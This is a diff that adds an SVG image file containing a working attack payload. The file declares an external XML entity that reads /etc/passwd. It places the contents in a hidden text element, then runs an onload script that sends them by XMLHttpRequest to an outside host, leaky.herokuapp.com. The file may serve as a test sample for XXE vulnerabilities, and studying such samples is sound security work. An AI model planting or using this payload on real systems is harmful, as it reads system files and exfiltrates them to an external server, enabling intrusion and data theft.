@@ -1,0 +1,32 @@
+<!DOCTYPE svg [ <!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+<svg onload="leak()" xmlns="http://www.w3.org/2000/svg"
+        xmlns:xlink="http://www.w3.org/1999/xlink"
+        xmlns:ev="http://www.w3.org/2001/xml-events"
+        version="1.1" baseProfile="full"
+        width="700px" height="400px" viewBox="0 0 700 400">
+  <script type="text/javascript"> <![CDATA[
+function leak()
+{
+var xmlhttp;
+var leak = document.getElementById('leaky').childNodes[0].data;
+if (window.XMLHttpRequest)
+  {// code for IE7+, Firefox, Chrome, Opera, Safari
+  xmlhttp=new XMLHttpRequest();
+  }
+else
+  {// code for IE6, IE5
+  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+  }
+xmlhttp.onreadystatechange=function()
+  {
+  if (xmlhttp.readyState==4 && xmlhttp.status==200)
+    {
+    }
+  }
+xmlhttp.open("GET","http://leaky.herokuapp.com/leak?leak="+leak,true);
+xmlhttp.send();
+}
+
+  ]]> </script>
+    <text id="leaky" style="visibility:hidden;display:none" x="20" y="40">ohai ! &ent;</text>
+</svg>
